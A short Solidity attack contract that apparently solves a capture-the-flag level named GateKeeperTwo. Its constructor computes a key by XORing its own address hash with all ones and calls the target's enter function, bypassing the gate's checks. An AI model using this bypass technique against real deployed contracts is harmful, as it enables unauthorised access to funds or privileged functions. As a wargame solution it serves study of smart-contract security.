// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/gateKeeperTwoInterface.sol';

contract GateKeeperTwoAttack {
    GateKeeperTwoInterface gate;
    constructor(address _address) public {
        gate = GateKeeperTwoInterface(_address);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        bool result = gate.enter(gateKey);
    }
}